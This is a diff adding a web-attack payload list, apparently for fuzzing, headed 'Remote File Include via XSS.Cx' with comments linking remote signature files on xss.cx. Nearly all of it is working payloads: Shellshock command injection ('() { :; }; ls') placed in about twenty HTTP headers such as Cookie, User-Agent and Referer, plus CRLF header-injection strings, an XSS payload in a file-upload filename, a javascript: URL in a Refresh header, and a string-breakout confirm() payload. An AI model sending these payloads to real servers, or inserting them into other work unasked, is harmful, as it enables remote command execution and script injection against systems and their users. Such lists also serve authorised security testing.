@@ -1,0 +1,36 @@
+/* Remote File Include via XSS.Cx */
+/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
+/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-signatures-only-fools-dont-use.txt */
+/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-css-injection-signatures-only-fools-dont-use.txt */
+/* Reference: http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html */
+/* HTTPi is best with %0A%0DLocation:%20http://Injection.FQDN, below are other examples, ymmv
+/* RFI START */
+Age: () { :; }; ls
+Cookie: () { :; }; ls
+Host: () { :; }; ls
+Referer: () { :; }; ls
+Location: () { :; }; ls
+Put: () { :; }; ls
+Accept-Charset: () { :; }; ls
+Accept: () { :; }; ls
+Accept-Encoding: () { :; }; ls
+Date: () { :; }; ls
+Expires: () { :; }; ls
+From: () { :; }; ls
+Host: () { :; }; ls
+Expect: () { :; }; ls
+Origin: () { :; }; ls
+Upgrade: () { :; }; ls
+User-Agent: () { :; }; ls
+Vary: () { :; }; ls
+Warning: () { :; }; ls
+Content-Disposition: form-data; name="file"; filename="test.<img src=a onerror=confirm(1)>"
+%0A%0DLocation:%20http://xss.cx
+"; ||confirm('XSS') || "
+Refresh: 0; URL=http://example.com;URL=javascript:alert(1)
+%0a%0d
+%0a%0a
+%0d%0d
+%0
+%d
+/* RFI STOP */
